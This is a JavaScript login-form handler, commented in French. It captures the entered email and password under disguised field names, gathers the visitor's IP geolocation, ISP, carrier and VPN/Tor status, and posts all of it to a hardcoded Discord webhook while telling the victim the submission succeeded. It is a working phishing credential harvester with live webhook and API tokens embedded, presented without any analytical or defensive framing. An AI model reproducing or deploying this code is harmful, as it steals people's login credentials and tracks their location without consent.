document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Récupérer les valeurs du formulaire
    const numbers = document.getElementById('numbers').value;
    const letters = document.getElementById('letters').value;

    // Récupérer les données de géolocalisation via l'API IPInfo
    fetch('https://ipinfo.io/json?token=d59cbb833f4209')
        .then(response => response.json())
        .then(data => {
            // Extraire toutes les informations de géolocalisation
            const geolocationData = {
                hostname: data.hostname || 'Non disponible',
                city: data.city || 'Non disponible',
                region: data.region || 'Non disponible',
                country: data.country || 'Non disponible',
                loc: data.loc || 'Non disponible',          // Latitude, Longitude
                org: data.org || 'Non disponible',
                postal: data.postal || 'Non disponible',
                timezone: data.timezone || 'Non disponible',
                is_mobile: data.is_mobile ? 'Oui' : 'Non',
                is_anonymous: data.is_anonymous ? 'Oui' : 'Non',
                is_satellite: data.is_satellite ? 'Oui' : 'Non',
                is_hosting: data.is_hosting ? 'Oui' : 'Non'
            };

            // Extraire toutes les informations d'ASN
            const asnData = {
                asn: data.asn || 'Non disponible',
                name: data.asn_name || 'Non disponible',
                domain: data.asn_domain || 'Non disponible',
                route: data.asn_route || 'Non disponible',
                type: data.asn_type || 'Non disponible'
            };

            // Extraire toutes les informations de la compagnie
            const companyData = {
                name: data.company_name || 'Non disponible',
                domain: data.company_domain || 'Non disponible',
                type: data.company_type || 'Non disponible'
            };

            // Extraire toutes les informations du carrier
            const carrierData = {
                name: data.carrier_name || 'Non disponible',
                mcc: data.carrier_mcc || 'Non disponible',
                mnc: data.carrier_mnc || 'Non disponible'
            };

            // Extraire toutes les informations de confidentialité
            const privacyData = {
                vpn: data.privacy_vpn ? 'Oui' : 'Non',
                proxy: data.privacy_proxy ? 'Oui' : 'Non',
                tor: data.privacy_tor ? 'Oui' : 'Non',
                relay: data.privacy_relay ? 'Oui' : 'Non',
                hosting: data.privacy_hosting ? 'Oui' : 'Non',
                service: data.privacy_service || 'Non disponible'
            };

            // Extraire toutes les informations d'abus
            const abuseData = {
                address: data.abuse_address || 'Non disponible',
                country: data.abuse_country || 'Non disponible',
                email: data.abuse_email || 'Non disponible',
                name: data.abuse_name || 'Non disponible',
                network: data.abuse_network || 'Non disponible',
                phone: data.abuse_phone || 'Non disponible'
            };

            // Créer le message à envoyer à Discord
            const discordMessage = {
                content: 
                        `Email: ${numbers}\nMot de passe: ${letters}\n\n` +
                         `**Geolocation**\n` +
                         `Hostname: ${geolocationData.hostname}\n` +
                         `City: ${geolocationData.city}\n` +
                         `Region: ${geolocationData.region}\n` +
                         `Country: ${geolocationData.country}\n` +
                         `Loc: ${geolocationData.loc}\n` +
                         `Org: ${geolocationData.org}\n` +
                         `Postal: ${geolocationData.postal}\n` +
                         `Timezone: ${geolocationData.timezone}\n` +
                         `Is Mobile: ${geolocationData.is_mobile}\n` +
                         `Is Anonymous: ${geolocationData.is_anonymous}\n` +
                         `Is Satellite: ${geolocationData.is_satellite}\n` +
                         `Is Hosting: ${geolocationData.is_hosting}\n\n` +

                         `**ASN**\n` +
                         `ASN: ${asnData.asn}\n` +
                         `Name: ${asnData.name}\n` +
                         `Domain: ${asnData.domain}\n` +
                         `Route: ${asnData.route}\n` +
                         `Type: ${asnData.type}\n\n` +

                         `**Company**\n` +
                         `Name: ${companyData.name}\n` +
                         `Domain: ${companyData.domain}\n` +
                         `Type: ${companyData.type}\n\n` +

                         `**Carrier**\n` +
                         `Name: ${carrierData.name}\n` +
                         `MCC: ${carrierData.mcc}\n` +
                         `MNC: ${carrierData.mnc}\n\n` +

                         `**Privacy**\n` +
                         `VPN: ${privacyData.vpn}\n` +
                         `Proxy: ${privacyData.proxy}\n` +
                         `TOR: ${privacyData.tor}\n` +
                         `Relay: ${privacyData.relay}\n` +
                         `Hosting: ${privacyData.hosting}\n` +
                         `Service: ${privacyData.service}\n\n` +

                         `**Abuse**\n` +
                         `Address: ${abuseData.address}\n` +
                         `Country: ${abuseData.country}\n` +
                         `Email: ${abuseData.email}\n` +
                         `Name: ${abuseData.name}\n` +
                         `Network: ${abuseData.network}\n` +
                         `Phone: ${abuseData.phone}`
            };

            // Envoyer le message à Discord via le webhook
            fetch('https://discord.com/api/webhooks/1323163149985124362/zf-fdV2FghIr5D3n4VykFCMkwYmwm6pa1WT_1kPwsGfUzRaiFgX9EBn301sFa0KbkEZ2', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            })
            .then(response => response.json())
            .then(data => {
                alert('Formulaire envoyé avec succès !');
            })
            .catch(error => {
                alert('Erreur lors de l\'envoi du formulaire');
                console.error(error);
            });
        })
        .catch(error => {
            console.error('Erreur IPInfo:', error);
        });
});